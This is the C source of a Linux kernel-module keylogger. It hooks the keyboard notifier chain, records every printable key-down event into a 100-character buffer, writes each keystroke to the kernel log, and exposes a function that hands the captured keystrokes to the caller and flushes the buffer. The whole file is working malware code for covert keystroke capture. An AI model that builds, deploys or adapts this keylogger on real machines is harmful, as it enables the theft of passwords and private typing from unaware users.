#include "keylogger.h"
#include "logging.h"

#include <linux/notifier.h>
#include <linux/keyboard.h>
#include <linux/errno.h>
#include <linux/spinlock.h>

static int keylogger_notify(struct notifier_block* blk, unsigned long code, void* param);

#define NUM_CHARS 100
#define S_CHARS_SIZE 101 // Extra char for null term

static char s_chars[S_CHARS_SIZE];

static size_t s_counter = 0;

//static spinlock_t s_lock = SPIN_LOCK_UNLOCKED;

static struct notifier_block s_nblk = {
    .notifier_call = keylogger_notify
};

/**
 * Write keypress events as ASCII chars to the internal buffer
 */
void store_event(struct keyboard_notifier_param* param) {
    unsigned char value;

    // Only save down events
    if (!param->down) {
        return;
    }

    // Get the ASCII value from the param and store it in
    // the next slot in the buffer
    value = param->value & 0x00ff;
    s_chars[s_counter++ % NUM_CHARS] = value;

    LOG_INFO(
        "Keylogger event: %c\n",
        value
        );
}

/**
 * Register for callbacks from the keyboard driver
 */
int keylogger_register(void) {
    // Zero out the internal buffer
    memset(s_chars, 0, S_CHARS_SIZE);

    return register_keyboard_notifier(&s_nblk);
}

/**
 * Unregister from callback from the keyboard driver
 */
void keylogger_unregister(void) {
    unregister_keyboard_notifier(&s_nblk);
}

/**
 * Handle a notification from the keyboard driver about a keypress event.
 * Returns NOTIFY_OK on success or if the event was ignored.
 */
int keylogger_notify(struct notifier_block* blk, unsigned long code, void* param) {
    unsigned char type;
    struct keyboard_notifier_param* kbdParam = param;

    // We are only interested in keysym notifications.
    if (code != KBD_KEYSYM) {
        return NOTIFY_OK;
    }

    // If param is NULL then return error
    if (!param) {
        return NOTIFY_BAD;
    }

    // Translate the keysym into a ascii char. If it is not a printable character
    // ignore it for now.
    type = (kbdParam->value >> 8) & 0x0f;
    switch (type) {
    case 0x0:
    case 0xb:
        // ASCII 'printable' chars.
        store_event(kbdParam);
        break;
    default:
        // Ignore everything else
        break;
    }

    return NOTIFY_OK;
}

/**
 * Return the last keypress events, flushing them from the internal
 * buffer.
 * Returns the number of chars copied on success otherwise a negative error code.
 */
ssize_t keylogger_last_events(char* buf, size_t len) {
    size_t copied;

    // Buffer size must be big enough
    if (len < NUM_CHARS) {
        return -ENOBUFS;
    }

    // Copy all chars up to the first null
    copied = strlcpy(buf, s_chars, len);

    // Clear down the internal buffer and reset the char counter to zero
    memset(s_chars, 0, S_CHARS_SIZE);
    s_counter = 0;

    return (ssize_t)copied;
}
